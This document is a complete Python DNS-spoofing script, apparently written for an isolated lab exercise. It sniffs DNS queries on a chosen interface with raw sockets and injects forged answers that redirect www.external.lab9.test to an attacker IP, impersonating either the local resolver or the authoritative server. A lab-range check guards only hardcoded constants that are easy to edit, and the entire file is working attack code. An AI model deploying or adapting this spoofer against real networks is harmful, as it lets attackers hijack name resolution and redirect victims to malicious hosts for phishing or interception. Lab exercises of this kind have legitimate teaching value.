#!/usr/bin/env python3
"""LAB9 DNS spoof (raw-socket variant) - isolated DNS-LAB only.
Reimplements dns_spoof_lab9.py's logic with AF_PACKET raw sockets instead of
scapy.sniff(), which was unreliable capturing foreign unicast frames under
nested VirtualBox Internal Network promiscuous mode in this environment.
Same safety scope: only matches www.external.lab9.test on 10.9.0.0/24.
"""
import argparse, ipaddress, socket, struct, sys

VICTIM = '10.9.0.100'
RESOLVER = '10.9.0.10'
ATTACKER = '10.9.0.200'
AUTH = '172.16.6.20'
TARGET = b'www.external.lab9.test.'
ETH_P_ALL = 3

def safe_ip(s):
    ip = ipaddress.ip_address(s)
    if ip not in ipaddress.ip_network('10.9.0.0/24') and ip != ipaddress.ip_address(AUTH):
        raise ValueError('LAB safety: address outside approved lab range')
    return ip

for x in [VICTIM, RESOLVER, ATTACKER, AUTH]:
    safe_ip(x)

def parse_qname(data, off):
    labels = []
    while True:
        ln = data[off]
        off += 1
        if ln == 0:
            break
        labels.append(data[off:off+ln])
        off += ln
    return b'.'.join(labels) + b'.', off

def ip_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum((data[i] << 8) + data[i+1] for i in range(0, len(data), 2))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def build_udp_dns(src_ip, dst_ip, src_port, dst_port, dns_payload):
    udp_len = 8 + len(dns_payload)
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)
    pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip) + struct.pack('!BBH', 0, 17, udp_len)
    udp_csum = ip_checksum(pseudo + udp_header + dns_payload)
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, udp_csum if udp_csum != 0 else 0xffff)
    udp_packet = udp_header + dns_payload

    total_len = 20 + len(udp_packet)
    ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, total_len, 0, 0, 64, 17, 0,
                             socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    csum = ip_checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, total_len, 0, 0, 64, 17, csum,
                             socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    return ip_header + udp_packet

def eth_frame(dst_mac, src_mac, payload, ethertype=0x0800):
    return dst_mac + src_mac + struct.pack('!H', ethertype) + payload

def get_mac(ifname):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((ifname, 0))
    mac = s.getsockname()[4]
    s.close()
    return mac

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--mode', choices=['victim', 'resolver'], required=True)
    ap.add_argument('--iface', required=True)
    args = ap.parse_args()

    my_mac = get_mac(args.iface)
    print('LAB9 ONLY: listening for www.external.lab9.test on isolated DNS-LAB', flush=True)
    print('mode=', args.mode, 'iface=', args.iface, flush=True)

    rsock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    rsock.bind((args.iface, 0))
    ssock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    ssock.bind((args.iface, 0))

    while True:
        frame, addr = rsock.recvfrom(65535)
        if len(frame) < 42:
            continue
        eth_dst = frame[0:6]
        eth_src = frame[6:12]
        eth_type = struct.unpack('!H', frame[12:14])[0]
        if eth_type != 0x0800:
            continue
        ip_hdr = frame[14:34]
        if len(ip_hdr) < 20:
            continue
        ihl = (ip_hdr[0] & 0x0f) * 4
        proto = ip_hdr[9]
        if proto != 17:
            continue
        src_ip = socket.inet_ntoa(ip_hdr[12:16])
        dst_ip = socket.inet_ntoa(ip_hdr[16:20])
        udp_off = 14 + ihl
        udp_hdr = frame[udp_off:udp_off+8]
        if len(udp_hdr) < 8:
            continue
        sport, dport, udp_len, _ = struct.unpack('!HHHH', udp_hdr)
        if dport != 53:
            continue
        dns_payload = frame[udp_off+8: udp_off+udp_len]
        if len(dns_payload) < 12:
            continue
        flags = struct.unpack('!H', dns_payload[2:4])[0]
        qr = (flags >> 15) & 1
        if qr != 0:
            continue
        try:
            qname, qend = parse_qname(dns_payload, 12)
        except Exception:
            continue
        if qname.lower() != TARGET:
            continue

        rd = dns_payload[2] & 0x01
        if args.mode == 'victim':
            if src_ip != VICTIM or dst_ip != RESOLVER:
                continue
            resp_src, resp_dst = RESOLVER, VICTIM
            resp_dst_mac = eth_src
            aa, ra = 0, 1
        else:
            if src_ip != RESOLVER or dst_ip != AUTH:
                continue
            resp_src, resp_dst = AUTH, RESOLVER
            resp_dst_mac = eth_src
            aa, ra = 1, 0

        txid = dns_payload[0:2]
        flags_resp = 0x8000 | (aa << 10) | (rd << 8) | (ra << 7)
        header = txid + struct.pack('!HHHHH', flags_resp, 1, 1, 0, 0)
        question = dns_payload[12:qend+4]
        answer = b'\xc0\x0c' + struct.pack('!HHIH', 1, 1, 120, 4) + socket.inet_aton(ATTACKER)
        dns_resp = header + question + answer

        udp_dns = build_udp_dns(resp_src, resp_dst, 53, sport, dns_resp)
        out_frame = eth_frame(resp_dst_mac, my_mac, udp_dns)
        ssock.send(out_frame)
        print(f'[LAB9] forged {args.mode} response: {TARGET.decode()} -> {ATTACKER}; '
              f'txid={txid.hex()}; dst={resp_dst}:{sport}', flush=True)

if __name__ == '__main__':
    main()
